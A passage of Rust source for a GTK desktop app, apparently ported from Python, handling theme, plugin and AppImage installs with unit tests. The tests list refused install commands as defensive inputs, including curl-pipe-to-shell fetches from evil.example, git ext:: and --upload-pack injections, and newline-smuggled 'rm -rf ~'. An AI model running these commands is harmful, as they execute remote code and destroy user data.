                win.apply_theme_now(&p);
            }
        });
        self.toasts.add_toast(toast);
    }

    pub fn apply_theme_now(&self, p: &Plugin) {
        let w = self.downgrade();
        let p = p.clone();
        tasks::confirm(
            &self.window,
            &format!("Switch to {}?", p.name),
            &tr("Applies the theme to the whole desktop — bar, terminal, editor \
                 and this window. Your previous theme stays installed."),
            &format!("$ omarchy theme set {}", p.name),
            &tr("Apply"),
            false,
            move || {
                let Some(win) = w.upgrade() else { return };
                let w = w.clone();
                let after_p = p.clone();
                tasks::run(
                    &win.window,
                    &format!("Applying {}", p.name),
                    vec![Step::argv(format!("Applying {}", p.name), theme_set_argv(&p.name))],
                    Some(Box::new(move |ok| {
                        if let Some(win) = w.upgrade() {
                            win.after_theme(ok, &after_p);
                        }
                    })),
                );
            },
        );
    }

    pub fn after_theme(&self, ok: bool, p: &Plugin) {
        if ok {
            if let Err(e) = self.apply_theme() {
                eprintln!("almanac: {e}");
                return;
            }
            let has_hero = self.today.borrow().hero.is_some();
            if has_hero {
                self.refresh_hero();
            }
            self.say(&format!("Now wearing {}", p.name), 5);
        }
    }

    // ---- store entries that are AppImages, not plugins ----
    pub fn install_store_appimage(&self, p: &Plugin) {
        let dest = store_appimage_path(p);
        let t = or_log!(p.try_trust());
        let licence = if p.license.is_empty() { "unstated" } else { p.license.as_str() };
        let detail = format!(
            "Publisher   {}\nProvenance  {} — {}\nLicence     {}\nVersion     {}\n\
             Download    {} ({:.0} MB)\nInstalls to {}",
            or_log!(p.try_publisher()),
            t.label,
            t.why,
            licence,
            p.version,
            p.asset_name,
            p.size_mb,
            dest.display()
        );
        let w = self.downgrade();
        let p = p.clone();
        tasks::confirm(
            &self.window,
            &format!("Install {}?", p.name),
            &format!(
                "{:.0} MB will be downloaded from GitHub and kept \
                 with Almanac's apps, with a launcher entry.",
                p.size_mb
            ),
            &detail,
            &tr("Install"),
            false,
            move || {
                let Some(win) = w.upgrade() else { return };
                let step_p = p.clone();
                let step_dest = dest.clone();
                let fetch: StepFn =
                    Arc::new(move |log: LogFn<'_>| Win::fetch_appimage(log, &step_p, &step_dest));
                // `holder=self._watch_defaults()`: a default argument, so it
                // is read when this runs, before the task starts.
                // Raising there ends the callback before the task starts.
                let holder = match win.try_watch_defaults() {
                    Ok(holder) => holder,
                    Err(e) => {
                        eprintln!("almanac: {e}");
                        return;
                    }
                };
                let w = w.clone();
                let after_p = p.clone();
                tasks::run(
                    &win.window,
                    &format!("Installing {}", p.name),
                    vec![Step::call(format!("Downloading {} {}", p.name, p.version), fetch)],
                    Some(Box::new(move |ok| {
                        let Some(win) = w.upgrade() else { return };
                        if ok {
                            if let Err(e) = win.try_check_defaults(holder) {
                                eprintln!("almanac: {e}");
                                return;
                            }
                        }
                        win.store_after(ok, &after_p, "installed");
                    })),
                );
            },
        );
    }

    /// Download, register and add a launcher entry. Raises on failure.
    ///
    /// Runs on the task's worker thread, so it takes no `&self` (`Win` is
    /// not `Send`).
    pub fn fetch_appimage(log: LogFn<'_>, p: &Plugin, dest: &Path) -> Result<(), String> {
        if let Some(parent) = dest.parent() {
            py_mkdir_parents(parent)?;
        }
        log(&format!("{}  ({:.0} MB)", p.asset_name, p.size_mb));
        log(&format!("from {}", p.download_url));

        let seen = Cell::new(0i64);

        // `int(frac * 100)`: `download` passes done/total of two integers with
        // total > 0, so frac is always finite and the cast cannot meet the
        // NaN or infinity Python's int() would raise on.
        let progress = |frac: f64| {
            let pct = (frac * 100.0) as i64;
            if pct >= seen.get() + 10 { // one line per 10%, not per chunk
                seen.set(pct);
                log(&format!("  {pct}%"));
            }
        };

        // Checked against the asset's published sha256 when it has one.
        crate::appimage::download_verified(&p.download_url, dest, Some(&progress), &p.sha256)?;
        if !p.sha256.is_empty() {
            log("checksum verified");
        }
        log("downloaded, registering");

        // Read and written under the registry's lock, so an entry another
        // writer changed meanwhile is kept as they left it.
        {
            let _lock = inventory::lock_registry()?;
            let reg = registry_with(p, dest)?;
            inventory::save_registry(&reg)?;
        }
        if crate::appimage::install_desktop_entry(dest, &p.id)? {
            log("launcher entry added");
        }
        log(&format!("{} {} installed", p.name, p.version));
        Ok(())
    }

    pub fn remove_store_appimage(&self, p: &Plugin) {
        let p = &self.live(p);
        let version = if p.local_version.is_empty() { &p.version } else { &p.local_version };
        let mut extra = serde_json::Map::new();
        extra.insert("key".into(), Value::String(p.id.clone()));
        let entry = inventory::App {
            name: p.name.clone(),
            version: version.clone(),
            source: inventory::APPIMAGE.to_string(),
            description: String::new(),
            update: String::new(),
            exec_path: store_appimage_path(p).to_string_lossy().into_owned(),
            extra: extra.into(),
        };
        let detail = format!("{}\n{}", entry.exec_path, entry.exec_path.replace(".AppImage", ".previous"));
        let w = self.downgrade();
        let p = p.clone();
        tasks::confirm(
            &self.window,
            &format!("Remove {}?", p.name),
            &tr("The AppImage, its rollback copy and its launcher entry are \
                 deleted. Documents you created with it are untouched."),
            &detail,
            &tr("Remove"),
            true,
            move || {
                if let Some(win) = w.upgrade() {
                    win.remove_appimage(&entry);
                    win.store_after(true, &p, "removed");
                }
            },
        );
    }

    /// The app ran the command, so it knows when to re-read the system.
    ///
    /// False where the Python raises (see `annotate_plugins`), so a caller
    /// with more to do after it stops there too.
    pub fn store_after(&self, ok: bool, p: &Plugin, verb: &str) -> bool {
        if !ok {
            self.say(&format!("{} was not {}", p.name, verb), 5);
            return true;
        }
        if !self.annotate_plugins() {
            return false;
        }
        self.store_refresh();
        self.say(&format!("{} {}", p.name, verb), 5);
        if p.install_kind == "appimage" {
            self.reload();
        }
        true
    }

    /// `store_mod.annotate(self._plugins)`. False where the Python raises:
    /// `_plugins` is None after Preferences' `reload_store`, annotate's loop
    /// raises TypeError; or annotate itself raises. Either way the caller
    /// stops there (logged, no toast).
    ///
    /// The list is taken out for the call and put back, so nothing annotate
    /// reaches can find `shared` borrowed.
    fn annotate_plugins(&self) -> bool {
        let none = self.shared.borrow().plugins_none;
        if none {
            eprintln!("almanac: TypeError: 'NoneType' object is not iterable");
            return false;
        }
        let mut plugins = std::mem::take(&mut self.shared.borrow_mut().plugins);
        let r = store_mod::try_annotate(std::sync::Arc::<Vec<_>>::make_mut(&mut plugins));
        self.shared.borrow_mut().plugins = plugins;
        if let Err(e) = r {
            eprintln!("almanac: {e}");
            return false;
        }
        true
    }

    /// The full listing for one plugin, as the marketplace shows it.
    pub fn show_plugin(&self, p: &Plugin) {
        let p = &self.live(p);
        let dialog = adw::Dialog::builder().title(&p.name).build();
        dialog.set_content_width(620);
        dialog.set_content_height(680);

        let view = adw::ToolbarView::new();
        view.add_top_bar(&adw::HeaderBar::new());

        let page = adw::PreferencesPage::new();

        let hero = adw::PreferencesGroup::new();
        let head = gtk::Box::new(gtk::Orientation::Vertical, 8);

        let shot = gtk::Box::new(gtk::Orientation::Horizontal, 0);
        shot.add_css_class("store-shot");
        shot.set_size_request(-1, 300);
        shot.set_overflow(gtk::Overflow::Hidden);
        let pic = gtk::Picture::new();
        pic.set_content_fit(gtk::ContentFit::Cover);
        pic.set_hexpand(true);
        pic.set_vexpand(true);
        if !p.preview.is_empty() {
            shot.append(&pic);
            head.append(&shot);

            let w = self.downgrade();
            let job = p.clone();
            let pic = pic.clone();
            self.thumb_bg(
                move || store_mod::fetch_thumb(&job, true),
                move |path| {
                    let Some(path) = path else { return };
                    let Some(win) = w.upgrade() else { return };
                    if let Some(tex) = win.texture(&path, 640) {
                        pic.set_paintable(Some(&tex));
                    }
                },
            );
        }

        let title = gtk::Label::builder().label(&p.name).xalign(0.0).wrap(true).build();
        title.add_css_class("title-2");
        head.append(&title);
        let subtitle = or_log!(p.try_subtitle());
        if !subtitle.is_empty() {
            let byline = gtk::Label::builder().label(&subtitle).xalign(0.0).build();
            byline.add_css_class("dim-label");
            head.append(&byline);
        }

        let badges = gtk::Box::new(gtk::Orientation::Horizontal, 6);
        badges.set_halign(gtk::Align::Start);
        for (text, css) in or_log!(Win::plugin_badges(p)) {
            let lbl = gtk::Label::new(Some(&text));
            lbl.add_css_class(&css);
            badges.append(&lbl);
        }
        head.append(&badges);

        if !p.description.is_empty() {
            let body = gtk::Label::builder().label(&p.description).xalign(0.0).wrap(true).build();
            body.set_wrap_mode(pango::WrapMode::WordChar);
            head.append(&body);
        }
        if !p.install_note.is_empty() {
            let note = gtk::Label::builder().label(&p.install_note).xalign(0.0).wrap(true).build();
            note.add_css_class("dim-label");
            note.add_css_class("caption");
            head.append(&note);
        }

        hero.add(&head);
        page.add(&hero);

        let t = or_log!(p.try_trust());
        let prov = adw::PreferencesGroup::builder()
            .title(tr("Provenance"))
            .description(tr("Where this comes from and what has actually been \
                             checked about it"))
            .build();
        Win::detail_row(&prov, &tr("Marketplace"), &or_log!(p.try_market_name_text()));
        Win::detail_row(&prov, &tr("Publisher"), &or_log!(p.try_publisher()));
        Win::detail_row(&prov, &tr("Declared author"), &p.author);
        Win::detail_row(&prov, &tr("Assurance"), &format!("{} — {}", t.label, t.why));
        if !p.review_method.is_empty() {
            Win::detail_row(&prov, &tr("Review"), &p.review_method.replace('-', " "));
        }
        Win::detail_row(&prov, &tr("Reviewed by"), &p.reviewed_by);
        let validated = if !p.validated_commit.is_empty() {
            format!("{} on {}", head_chars(&p.validated_commit, 12), p.validated_branch)
        } else {
            String::new()
        };
        Win::detail_row(&prov, &tr("Validated commit"), &validated);
        Win::detail_row(&prov, &tr("Validated"), &head_chars(&p.validated_at, 10));
        let upstream = if !p.upstream_commit.is_empty() {
            format!(
                "{}{}",
                head_chars(&p.upstream_commit, 12),
                if p.drifted() { "  (differs from what was validated)" } else { "  (matches)" }
            )
        } else {
            String::new()
        };
        Win::detail_row(&prov, &tr("Upstream commit now"), &upstream);
        let checked = if !p.upstream_checked_at.is_empty() {
            format!(
                "{}{}",
                head_chars(&p.upstream_checked_at, 10),
                if !p.upstream_status.is_empty() {
                    format!(" — {}", p.upstream_status)
                } else {
                    String::new()
                }
            )
        } else {
            String::new()
        };
        Win::detail_row(&prov, &tr("Upstream last checked"), &checked);
        Win::detail_row(&prov, &tr("Manifest"), &p.manifest_path);
        page.add(&prov);

        let facts = adw::PreferencesGroup::builder().title(tr("Listing")).build();
        let stars = if p.stars != 0 { p.stars.to_string() } else { String::new() };
        for (label, value) in [
            ("Identifier", p.id.clone()),
            ("Version", p.version.clone()),
            ("Category", p.category.clone()),
            ("Kind", p.kind.clone()),
            ("Status", p.status.clone()),
            ("Tags", p.tags.join(", ")),
            ("Stars", stars),
            ("Licence", p.license.clone()),
            ("Updated", head_chars(&p.updated, 10)),
            ("Listed", head_chars(&p.added, 10)),
            ("Install command", p.install_cmd.clone()),
        ] {
            Win::detail_row(&facts, label, &value);
        }
        page.add(&facts);

        let links = adw::PreferencesGroup::new();
        for (label, url, icon) in [
            ("Marketplace listing", or_log!(p.try_page_text()), "web-browser-symbolic"),
            ("Source repository", p.repo.clone(), "folder-remote-symbolic"),
        ] {
            if url.is_empty() {
                continue;
            }
            // `self._plain(title=label, subtitle=url, activatable=True)`.
            let row = adw::ActionRow::builder().activatable(true).build();
            row.set_use_markup(false);
            if !label.is_empty() {
                row.set_title(label);
            }
            row.set_subtitle(&url);
            row.add_suffix(&gtk::Image::from_icon_name(icon));
            let w = self.downgrade();
            row.connect_activated(move |_r| {
                if let Some(win) = w.upgrade() {
                    win.open_url(&url);
                }
            });
            links.add(&row);
        }
        page.add(&links);

        view.set_content(Some(&page));

        let bottom = gtk::Box::builder()
            .spacing(8)
            .margin_start(12)
            .margin_end(12)
            .margin_top(8)
            .margin_bottom(12)
            .halign(gtk::Align::End)
            .build();
        // Handlers hold the dialog weakly: it owns them, through its child.
        let closer = {
            let d = dialog.downgrade();
            move || {
                if let Some(d) = d.upgrade() {
                    d.close();
                }
            }
        };
        if p.installed && p.install_kind == "theme" {
            let apply = gtk::Button::with_label(&tr("Apply"));
            apply.add_css_class("suggested-action");
            {
                let (w, p, close) = (self.downgrade(), p.clone(), closer.clone());
                apply.connect_clicked(move |_b| {
                    close();
                    if let Some(win) = w.upgrade() {
                        win.apply_theme_now(&p);
                    }
                });
            }
            if !p.built_in {
                let rm = gtk::Button::with_label(&tr("Remove"));
                rm.add_css_class("destructive-action");
                let (w, p, close) = (self.downgrade(), p.clone(), closer.clone());
                rm.connect_clicked(move |_b| {
                    close();
                    if let Some(win) = w.upgrade() {
                        win.on_plugin_remove(&p);
                    }
                });
                bottom.append(&rm);
            }
            bottom.append(&apply);
        } else if p.installed && !p.built_in {
            let rm = gtk::Button::with_label(&tr("Remove"));
            rm.add_css_class("destructive-action");
            {
                let (w, p, close) = (self.downgrade(), p.clone(), closer.clone());
                rm.connect_clicked(move |_b| {
                    close();
                    if let Some(win) = w.upgrade() {
                        win.on_plugin_remove(&p);
                    }
                });
            }
            bottom.append(&rm);
            if p.install_kind == "plugin" {
                // A switch shows the state as well as changing it.
                let holder = gtk::Box::builder().spacing(6).valign(gtk::Align::Center).build();
                holder.append(&gtk::Label::new(Some(&tr("On"))));
                let sw = gtk::Switch::builder().active(p.enabled).valign(gtk::Align::Center).build();
                name(&sw, &if p.enabled { format!("{} on", p.name) } else { format!("{} off", p.name) });
                // One object for the dialog's life, as the Python's `info`:
                // each toggle sees what the last one wrote to it.
                let info = std::rc::Rc::new(std::cell::RefCell::new(plugins_mod::Installed {
                    id: p.id.clone(),
                    name: p.name.clone(),
                    enabled: p.enabled,
                    ..Default::default()
                }));
                let w = self.downgrade();
                let guard = SwitchGuard::default();
                let g = guard.clone();
                guard.connect(&sw, move |sw, on| match w.upgrade() {
                    Some(win) => win.plugin_switch(sw, on, &g, info.clone()),
                    None => glib::Propagation::Proceed,
                });
                holder.append(&sw);
                bottom.append(&holder);
                let folder = match self.plugin_dir(p) {
                    Ok(folder) => folder,
                    // Raised out of the Python method before the dialog
                    // was presented: logged, nothing shown.
                    Err(e) => {
                        eprintln!("almanac: {e}");
                        return;
                    }
                };
                if let Some(folder) = folder {
                    // What has_panel raises ends `_show_plugin` before the
                    // dialog is presented.
                    let panel = shortcuts::available()
                        && match shortcuts::try_has_panel(&folder) {
                            Ok(panel) => panel,
                            Err(e) => {
                                eprintln!("almanac: {e}");
                                return;
                            }
                        };
                    if panel {
                        let sc = gtk::Button::with_label(&tr("Shortcut…"));
                        let (w, p, close) = (self.downgrade(), p.clone(), closer.clone());
                        sc.connect_clicked(move |_b| {
                            close();
                            if let Some(win) = w.upgrade() {
                                win.edit_shortcut(&p.id, &p.name);
                            }
                        });
                        bottom.append(&sc);
                    }
                }
            }
            if p.needs_setup {
                let fin = gtk::Button::with_label(&tr("Finish setup"));
                fin.add_css_class("suggested-action");
                let (w, p, close) = (self.downgrade(), p.clone(), closer.clone());
                fin.connect_clicked(move |_b| {
                    close();
                    if let Some(win) = w.upgrade() {
                        win.offer_setup(&p);
                    }
                });
                bottom.append(&fin);
            }
        } else if p.installed && p.built_in {
            let lbl = gtk::Label::new(Some(&tr("Built in")));
            lbl.add_css_class("pill-ok");
            bottom.append(&lbl);
        } else if p.can_install() {
            let content = adw::ButtonContent::builder().icon_name(INSTALL_ICON).label(tr("Install")).build();
            let ins = gtk::Button::builder().child(&content).build();
            ins.add_css_class("suggested-action");
            let (w, p, close) = (self.downgrade(), p.clone(), closer.clone());
            ins.connect_clicked(move |_b| {
                close();
                if let Some(win) = w.upgrade() {
                    win.on_plugin_install(&p);
                }
            });
            bottom.append(&ins);
        }
        view.add_bottom_bar(&bottom);

        dialog.set_child(Some(&view));
        dialog.present(Some(&self.window));
    }

    /// `@staticmethod _plugin_badges`: (text, css class) pills for a plugin.
    /// `Err` where `p.trust` raises.
    pub fn plugin_badges(p: &Plugin) -> Result<Vec<(String, String)>, String> {
        let mut out = Vec::new();
        if p.installed {
            out.push((
                if !p.built_in { "Installed" } else { "Built in" }.to_string(),
                "pill-ok".to_string(),
            ));
        }
        let t = p.try_trust()?;
        out.push((t.label, t.css));
        if !p.status.is_empty() && p.status != "Available" {
            out.push((p.status.clone(), "pill".to_string()));
        }
        if p.stars != 0 {
            out.push((format!("★ {}", p.stars), "pill".to_string()));
        }
        if !p.category.is_empty() {
            out.push((p.category.clone(), "pill".to_string()));
        }
        Ok(out)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use regex::Regex;
    use std::cell::RefCell;
    use std::collections::BTreeSet;
    use std::rc::Rc;

    const CSS: &str = include_str!("../../data/style.css");

    /// The non-test half of this file: what the inspection tests look at.
    fn source() -> &'static str {
        static SRC: std::sync::LazyLock<String> = std::sync::LazyLock::new(|| {
            let path = Path::new(env!("CARGO_MANIFEST_DIR")).join(file!());
            let text = std::fs::read_to_string(&path).expect("own source");
            text.split("#[cfg(test)]").next().unwrap_or_default().to_string()
        });
        SRC.as_str()
    }

    fn plugin(id: &str, name: &str) -> Plugin {
        Plugin { id: id.into(), name: name.into(), ..Default::default() }
    }

    // ---- the stand-ins: `_Stub` and `_Confirmed` -------------------------

    #[derive(Default)]
    struct Record {
        /// `confirm_args`: heading, body, detail, action, destructive.
        confirm_args: Option<(String, String, String, String, bool)>,
        on_yes: Option<Rc<dyn Fn()>>,
        /// `ran`: every step handed to `tasks.run`.
        ran: Vec<Step>,
        done: Option<tasks::OnDone>,
        said: Vec<String>,
        store_after: Vec<(bool, String, String)>,
        offer_setup: Vec<Plugin>,
        theme_installed: Vec<(bool, String)>,
        applied: Vec<String>,
    }

    /// The window, with `tasks.confirm` / `tasks.run` mocked as `_Confirmed`
    /// does and `_say`, `_store_after`, `_offer_setup` as mocks.
    #[derive(Clone, Default)]
    struct Fake(Rc<RefCell<Record>>);

    impl Fake {
        fn say_yes(&self) {
            let on_yes = self.0.borrow().on_yes.clone().expect("nothing asked for confirmation");
            on_yes();
        }
        fn finish(&self, ok: bool) {
            let done = self.0.borrow_mut().done.take().expect("nothing was run");
            done(ok);
        }
        /// `_Confirmed.commands`.
        fn commands(&self) -> Vec<String> {
            self.0
                .borrow()
                .ran
                .iter()
                .map(|s| match &s.action {
                    tasks::StepAction::Argv(a) => a.join(" "),
                    _ => "<callable>".to_string(),
                })
                .collect()
        }
    }

    impl Host for Fake {
        fn say(&self, message: &str, _timeout: u32) {
            self.0.borrow_mut().said.push(message.to_string());
        }
        fn confirm(&self, heading: &str, body: &str, detail: &str, action: &str, destructive: bool, on_yes: Box<dyn Fn()>) {
            let mut r = self.0.borrow_mut();
            r.confirm_args =
                Some((heading.into(), body.into(), detail.into(), action.into(), destructive));
            r.on_yes = Some(Rc::from(on_yes));
        }
        fn run(&self, _title: &str, steps: Vec<Step>, on_done: tasks::OnDone) {
            let mut r = self.0.borrow_mut();
            r.ran.extend(steps);
            r.done = Some(on_done);
        }
        fn store_after(&self, ok: bool, p: &Plugin, verb: &str) -> bool {
            self.0.borrow_mut().store_after.push((ok, p.name.clone(), verb.into()));
            true
        }
        fn offer_setup(&self, p: &Plugin) {
            self.0.borrow_mut().offer_setup.push(p.clone());
        }
        fn theme_installed(&self, ok: bool, p: &Plugin) {
            self.0.borrow_mut().theme_installed.push((ok, p.name.clone()));
        }
        fn apply_theme_now(&self, p: &Plugin) {
            self.0.borrow_mut().applied.push(p.name.clone());
        }
        fn install_store_appimage(&self, _p: &Plugin) {
            unreachable!("not an AppImage");
        }
        fn remove_store_appimage(&self, _p: &Plugin) {
            unreachable!("not an AppImage");
        }
    }

    // ---- PluginStore.test_plugin_install_warns_that_plugins_are_unsandboxed

    #[test]
    fn plugin_install_warns_that_plugins_are_unsandboxed() {
        let fake = Fake::default();
        let p = Plugin {
            repo: "https://github.com/someone/thing".into(),
            install_cmd: "omarchy plugin add https://github.com/someone/thing --enable".into(),
            ..plugin("x.y", "Thing")
        };
        plugin_install(&fake, &p);
        {
            let r = fake.0.borrow();
            let (_, body, detail, _, _) = r.confirm_args.as_ref().expect("asked first");
            assert!(body.to_lowercase().contains("sandbox"));
            // Provenance has to be in front of the decision, not a click away.
            assert!(detail.contains("github.com/someone/thing"));
        }
        fake.say_yes();
        assert!(
            fake.commands().join(" ").contains("--yes"),
            "the prompt moved to the dialog, so the CLI must not block waiting for one"
        );
    }

    #[test]
    fn yes_is_only_added_where_the_command_takes_it() {
        // `plugin enable` does not take the flag at all.
        assert_eq!(install_argv("omarchy plugin enable x").unwrap(), ["omarchy", "plugin", "enable", "x"]);
        assert_eq!(
            install_argv("omarchy plugin add https://github.com/a/u --yes").unwrap(),
            ["omarchy", "plugin", "add", "https://github.com/a/u", "--yes"]
        );
        // shlex.split raises on an open quote.
        assert_eq!(install_argv("omarchy plugin add 'u"), Err("No closing quotation".to_string()));
    }

    #[test]
    fn install_command_is_split_as_shlex_splits_it() {
        // Values checked against Python's shlex.split.
        assert_eq!(shlex_split("a #b").unwrap(), ["a", "#b"]);
        assert_eq!(shlex_split(r#""a\$b""#).unwrap(), [r"a\$b"]);
        assert_eq!(shlex_split(r#""a\"b\\c""#).unwrap(), [r#"a"b\c"#]);
        assert_eq!(shlex_split("a\\\nb").unwrap(), ["a\nb"]);
        assert_eq!(shlex_split("a\rb").unwrap(), ["a", "b"]);
        assert_eq!(shlex_split("'a\\b' '' x\\ y").unwrap(), [r"a\b", "", "x y"]);
        assert_eq!(shlex_split("a\\"), Err("No escaped character".to_string()));
        assert_eq!(shlex_split("  ").unwrap(), Vec::<String>::new());
    }

    /// The catalog is remote; only the command shapes its listings use run.
    #[test]
    fn only_the_catalogs_own_command_shapes_run() {
        for ok in [
            "omarchy plugin add https://github.com/JJDizz1L/dizziee.cline-model-usage.git --enable",
            "omarchy plugin add https://github.com/a/b",
            "omarchy plugin enable omarchy.active-window",
        ] {
            assert!(install_argv(ok).is_ok(), "{ok}");
        }
        for bad in [
            "curl -fsSL https://evil.example/x.sh | sh",
            "sh -c 'curl https://evil.example | sh'",
            "omarchy plugin add http://github.com/a/b",
            "omarchy plugin add ext::sh -c touch% /tmp/pwned",
            "omarchy plugin add --upload-pack=touch https://github.com/a/b",
            "omarchy plugin add 'https://github.com/a/b\n; rm -rf ~'",
            "omarchy plugin add https://github.com/a/b --enable --enable",
            "omarchy plugin add https://github.com/a/b --config=x",
            "omarchy plugin enable ../../x",
            "omarchy plugin enable -x",
            "omarchy plugin remove x",
            "omarchy theme set x",
            "omarchy plugin add",
            "",
        ] {
            assert!(install_argv(bad).is_err(), "{bad:?}");
        }
        // What was refused is shown with its newline visible.
        let err = install_argv("omarchy plugin add 'https://x\nrm -rf ~'").unwrap_err();
        assert!(err.contains("'https://x\\nrm -rf ~'"), "{err}");
        assert!(!err.contains('\n'), "{err}");
    }

    #[test]
    fn a_refused_install_command_is_said_and_not_run() {
        let fake = Fake::default();
        let p = Plugin { install_cmd: "bash -c 'curl x | sh'".into(), ..plugin("x", "X") };
        plugin_install(&fake, &p);
        let r = fake.0.borrow();
        assert!(r.confirm_args.is_none());
        assert!(r.ran.is_empty());
        assert!(r.said.iter().any(|s| s.contains("X was not installed") && s.contains("'curl x | sh'")), "{:?}", r.said);
        drop(r);
        let theme = Plugin {
            install_kind: "theme".into(),
            install_cmd: "omarchy theme install --upload-pack=x".into(),
            ..plugin("t", "T")
        };
        plugin_install(&fake, &theme);
        let r = fake.0.borrow();
        assert!(r.confirm_args.is_none());
        assert!(r.said.iter().any(|s| s.contains("T was not installed")), "{:?}", r.said);
    }

    /// The confirmation shows the command quoted, as a shell would read it.
    #[test]
    fn the_confirmation_shows_the_command_quoted() {
        let argv: Vec<String> = ["omarchy", "plugin", "add", "https://h/a b", "--yes"].map(String::from).to_vec();
        assert_eq!(shown_argv(&argv), "omarchy plugin add 'https://h/a b' --yes");
    }

    #[test]
    fn a_bad_install_command_asks_nothing() {
        let fake = Fake::default();
        let p = Plugin { install_cmd: "omarchy plugin add 'u".into(), ..plugin("x", "X") };
        plugin_install(&fake, &p);
        assert!(fake.0.borrow().confirm_args.is_none());
        let theme = Plugin { install_kind: "theme".into(), ..plugin("t", "T") };
        plugin_install(&fake, &theme);
        assert!(fake.0.borrow().confirm_args.is_none());
    }

    // ---- ThemeActions ----------------------------------------------------

    #[test]
    fn removal_uses_the_theme_command_not_the_plugin_one() {
        let fake = Fake::default();
        let theme = Plugin {
            repo: "https://github.com/x/omarchy-lumon-theme".into(),
            install_kind: "theme".into(),
            installed: true,
            ..plugin("theme.x.y", "Lumon")
        };
        plugin_remove(&fake, &theme);
        fake.say_yes();
        let joined = fake.commands().join(" ");
        assert!(joined.contains("omarchy theme remove Lumon"));
        assert!(!joined.contains("plugin remove"), "a theme is not a plugin and the CLI knows it");
    }

    #[test]
    fn a_theme_shipped_with_omarchy_is_not_removable() {
        let fake = Fake::default();
        let stock = Plugin {
            repo: "https://github.com/x/omarchy-solitude-theme".into(),
            install_kind: "theme".into(),
            installed: true,
            built_in: true,
            ..plugin("theme.o.s", "Solitude")
        };
        plugin_remove(&fake, &stock);
        let r = fake.0.borrow();
        assert!(r.confirm_args.is_none(), "must not offer to remove what omarchy ships");
        assert!(r.ran.is_empty());
        assert!(!r.said.is_empty());
    }

    #[test]
    fn installing_a_theme_does_not_also_apply_it() {
        let fake = Fake::default();
        let theme = Plugin {
            repo: "https://github.com/x/omarchy-lumon-theme".into(),
            install_kind: "theme".into(),
            installable: true,
            install_cmd: "omarchy theme install https://github.com/x/omarchy-lumon-theme".into(),
            ..plugin("theme.x.y", "Lumon")
        };
        plugin_install(&fake, &theme);
        fake.say_yes();
        let joined = fake.commands().join(" ");
        assert!(joined.contains("theme install"));
        assert!(!joined.contains("theme set"), "installing must not re-skin the desktop on its own");
        assert!(fake.0.borrow().applied.is_empty());
    }

    // ---- PluginSetup.test_installing_says_setup_follows_and_then_offers_it

    #[test]
    fn installing_says_setup_follows_and_then_offers_it() {
        let fake = Fake::default();
        let p = Plugin {
            author: "a".into(),
            install_cmd: "omarchy plugin add https://github.com/a/x --enable".into(),
            installable: true,
            needs_setup: true,
            market: "omarchy".into(),
            ..plugin("x", "X")
        };
        plugin_install(&fake, &p);
        assert!(fake.0.borrow().confirm_args.as_ref().unwrap().1.contains("setup"));
        fake.say_yes();
        fake.finish(true);
        assert_eq!(fake.0.borrow().offer_setup, vec![p]);
    }

    #[test]
    fn setup_is_not_offered_when_store_after_raises() {
        // `_store_after` raising aborts `after` before `_offer_setup`.
        #[derive(Clone, Default)]
        struct Raising(Fake);
        impl Host for Raising {
            fn say(&self, m: &str, t: u32) {
                self.0.say(m, t)
            }
            fn confirm(&self, h: &str, b: &str, d: &str, a: &str, x: bool, y: Box<dyn Fn()>) {
                self.0.confirm(h, b, d, a, x, y)
            }
            fn run(&self, t: &str, s: Vec<Step>, d: tasks::OnDone) {
                self.0.run(t, s, d)
            }
            fn store_after(&self, _ok: bool, _p: &Plugin, _v: &str) -> bool {
                false
            }
            fn offer_setup(&self, p: &Plugin) {
                self.0.offer_setup(p)
            }
            fn theme_installed(&self, ok: bool, p: &Plugin) {
                self.0.theme_installed(ok, p)
            }
            fn apply_theme_now(&self, p: &Plugin) {
                self.0.apply_theme_now(p)
            }
            fn install_store_appimage(&self, p: &Plugin) {
                self.0.install_store_appimage(p)
            }
            fn remove_store_appimage(&self, p: &Plugin) {
                self.0.remove_store_appimage(p)
            }
        }
        let fake = Raising::default();
        let p = Plugin {
            install_cmd: "omarchy plugin add https://github.com/a/x".into(),
            needs_setup: true,
            ..plugin("x", "X")
        };
        plugin_install(&fake, &p);
        fake.0.say_yes();
        fake.0.finish(true);
        assert!(fake.0 .0.borrow().offer_setup.is_empty());
    }

    // ---- fetch_appimage's file handling ----------------------------------

    #[test]
    fn oserrors_read_as_python_prints_them() {
        let d = std::env::temp_dir().join(format!("almanac-sa-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        let file = d.join("f");
        std::fs::write(&file, "").unwrap();
        assert_eq!(py_mkdir_parents(&file), Err(format!("[Errno 17] File exists: '{}'", file.display())));
        let under = file.join("x");
        assert_eq!(py_mkdir_parents(&under), Err(format!("[Errno 20] Not a directory: '{}'", under.display())));
        assert_eq!(py_mkdir_parents(&d.join("a/b/c")), Ok(()));
        assert_eq!(py_mkdir_parents(&d.join("a/b")), Ok(()));
        let _ = std::fs::remove_dir_all(&d);
    }

    // ---- PluginShortcuts.test_store_removal_also_removes_the_shortcut -----

    #[test]
    fn store_removal_also_removes_the_shortcut() {
        let p = Plugin { install_kind: "plugin".into(), market: "omarchy".into(), ..plugin("x", "X") };
        let steps = plugin_remove_steps(&p);
        assert_eq!(steps[1].label, "Removing its keyboard shortcut");
        match &steps[0].action {
            tasks::StepAction::Argv(a) => assert_eq!(a, &["omarchy", "plugin", "remove", "x", "--yes"]),
            other => panic!("expected a command, got {other:?}"),
        }
    }

    // ---- small pieces ----------------------------------------------------

    #[test]
    fn python_path_joins() {
        assert_eq!(py_join(Path::new("/a"), ""), PathBuf::from("/a"));
        assert_eq!(py_join(Path::new("/a"), "README.md"), PathBuf::from("/a/README.md"));
        assert_eq!(py_join(Path::new("/a"), "."), PathBuf::from("/a"));
        assert_eq!(py_join(Path::new("/a"), "x/").as_os_str(), "/a/x");
        assert_eq!(py_join(Path::new("/a"), "x/./y//").as_os_str(), "/a/x/y");
        assert_eq!(py_join(Path::new("/a"), "/b"), PathBuf::from("/b"));
        assert_eq!(theme_url("omarchy theme install\x1fhttps://x"), Some("https://x".into()));
        assert_eq!(theme_url("  "), None);
        assert_eq!(head_chars("abcdefé", 7), "abcdefé");
        assert_eq!(head_chars("2024-01-02T03:04", 10), "2024-01-02");
    }

    #[test]
    fn a_store_appimage_lives_with_the_registry() {
        let p = plugin("thing", "Thing");
        let path = store_appimage_path(&p);
        assert!(path.ends_with("apps/thing.AppImage"));
        assert_eq!(path.parent().and_then(Path::parent), inventory::registry().parent());
    }

